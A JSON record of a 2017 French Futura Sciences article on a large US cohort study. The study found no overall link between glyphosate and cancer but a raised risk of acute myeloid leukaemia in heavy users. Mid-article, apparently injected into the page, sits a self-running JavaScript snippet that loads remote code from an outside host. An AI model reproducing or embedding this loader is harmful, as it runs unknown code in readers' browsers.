{"title": "Glyphosate et cancer : une etude americaine relance le debat", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-11-22", "content": "Une etude realisee dans l'Iowa et la Caroline du Nord, aux Etats-Unis, et portant sur une vingtaine d'annees n'a pas trouve de lien significatif entre l'utilisation du glyphosate et le risque de cancer. Seul le risque de leucemie aigue myeloide augmenterait nettement chez les gros utilisateurs de glyphosate. Ce qu'il faut retenir L'etude a porte sur environ 50.000 personnes travaillant dans le domaine agricole. Hormis pour la leucemie aigue myeloide, les chercheurs n'ont pas trouve de lien entre l'usage du glyphosate et la frequence de cancers. Ceci semble contredire la position du CIRC (Centre international de recherche sur le cancer), qui a classe le glyphosate comme  << cancerogene probable >>  en 2015. Alors que l'Union europeenne doit bientot decider de quelle  duree  elle va prolonger l'autorisation du glyphosate, une vaste etude americaine parue dans  Journal of the National Cancer Institute  vient semer le doute.  Cette etude prospective, appelee  Agricultural Health Study , a commence dans les annees 1990 et a suivi une  cohorte  de 54.251 agriculteurs et epandeurs de l'Iowa et de la Caroline du Nord (Etats-Unis) ; environ 83 % d'entre eux (44.932 personnes) utilisaient du glyphosate. Resultat : 5.779 cas de cancers ont ete detectes sur la periode d'etude. Cette derniere a ete financee par des institutions americaines comme l'Institut national du  cancer , et non par des industriels.  Le saviez-vous ? Le glyphosate est un  herbicide  a large spectre qui est arrive sur le marche dans les annees 1970. Il est aujourd'hui le plus utilise au monde. Aux Etats-Unis, a cause de l'introduction de cultures  OGM  resistantes au glyphosate, son utilisation a beaucoup augmente au cours des vingt dernieres annees. Le glyphosate, commercialise sous la marque Roundup, est souvent utilise par les jardiniers amateurs. Il apparait que l'utilisation de glyphosate n'etait pas associee au risque global de cancer. Cependant, ceux qui utilisaient le plus de glyphosate sur vingt ans avaient un risque bien plus eleve de  leucemie  aigue  myeloide  : par rapport a ceux qui n'avaient pas utilise de glyphosate, leur risque etait multiplie par un facteur 2,4. La leucemie aigue myeloide est un cancer de la moelle osseuse lie a la proliferation anormale de cellules precurseurs des globules blancs. (c) toeytoey, Fotolia                               Des pesticides toxiques pour l'Homme et l'environnement Ces resultats vont donc a l'encontre de la position du Centre international de recherche sur le cancer (CIRC), qui depend de l'Organisation mondiale de la sante ( OMS ). En 2015, il avait classe le glyphosate comme  <<  cancerogene  probable >>  en se basant sur des etudes realisees chez l'animal et d'autres, epidemiologiques, indiquant un risque accru de  lymphome  non hodgkinien.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Des pesticides classes potentiellement cancerogenes par l'OMS En 2013, une  expertise collective de l'Inserm  a egalement mis en evidence un lien entre l'exposition professionnelle a des  pesticides  et la  maladie de Parkinson  ainsi que certains cancers ( prostate , lymphome non hodgkinien,  myelome  multiple), sans preciser quels pesticides en particulier etaient concernes.  Enfin, outre le risque pour la sante humaine, la  contamination  des eaux par le glyphosate pose egalement des questions a propos de l'impact sur la  faune sauvage . Des etudes ont en effet montre la  toxicite  du glyphosate sur le  comportement  et le  developpement  des  poissons . Contrairement a ce que sous-entendait a une epoque la publicite de Monsanto pour le Roundup, qui lui a valu une condamnation pour publicite mensongere, le glyphosate n'est pas  biodegradable  et perdure dans l'environnement. Le glyphosate ou son produit de degradation l' AMPA  sont meme les  molecules  issues de  pesticides  les plus frequemment rencontrees dans les rivieres francaises.  Interview 3/5 : d'ou vient la pollution des sols ?                       La pollution des sols est souvent due a d'anciennes industries ayant rejete des polluants sur leur terrain d'exploitation ou a l'utilisation agricole d'engrais et de pesticides. Philippe Hubert, directeur des risques chroniques de l'Ineris, nous parle des solutions pour traiter un sol pollue.                                       ", "theme": "sante"}